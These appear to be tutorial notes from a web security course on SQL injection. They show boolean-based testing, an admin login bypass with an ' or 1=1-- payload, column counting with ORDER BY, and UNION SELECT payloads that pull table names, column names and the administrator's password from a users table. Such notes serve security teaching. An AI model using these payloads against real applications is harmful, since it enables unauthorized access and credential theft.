# Section 13: SQL Injection Vulnerabilities

## Discovering SQL Injections

In every input:
- Inject a statement that returns false
- Inject a statement that returns true
- Compare results

Example: In a filtering by category search param is being reflected on web page

(First try HTML injection, then XSS)

Original Statement:

```
Select * from shop where category = 'Food and Drink'
```

Injection test

```
Select * from shop where category = 'Food and Drink' and 1=1--`
```

dashes at the end to comment out

```
Select * from shop where category = 'Food and Drink' and 1=0--`
```

the web application broke at second query

---

## Bypassing Admin Login Using Logical Operators

Example: login credentials in login, breaking when entering password as quote

Visualize Original Statement

```
SELECT * FROM USERS WHERE username = '$username' AND password = '$password'
```

<b>SQL Injection</b>

```
SELECT * FROM users WHERE username = 'admin' AND password = `'test' or 1=1--`
````

this will evaluate to true

Payload:

```
` or 1=1--
```

---


## Selecting Data from the Database

<b>First should determine number of columns</b>

```
order+by+100000
```

will break the page because there is no so many columns

```
order+by+5
```

page breaks again, there are no so many columns


```
order+by+3
```

breaks again

```
order+by+2
```

page loads, we know <b>there are only 2 columns being selected</b>

<b>Build union, use another select statement that will be appended to existing select statement</b>

```
union+select+1,2--
```

(appended in the URL as a search query)

breaks page, because client uses another database engine

```
union+select+NULL,NULL--
```

page is loading

```
union+select+'a',NULL--
```

a is displayed in the page, if we substitute that with a value that we want to select from DB, it will be displayed at that place

```
union+select+version(),NULL--
```

---

## Accessing the Database Admin Records

Guessing db table

```
union+select+username,NULL+from+users
```

Get list of all the tables, varies depending on db engine, in postgres

```
union+select+table_name,NULL+from+information_schema.tables--
```

got a list of all db tables

Now, get the columns

```
union+select+column_name,NULL+from+information_schema.columns+where+table_name='users'--
```

Build a valid select statement to list users

```
union+select+username,NULL+from+users--
```

```
union+select+password,NULL+from+users+where+username='administrator'--
```

---
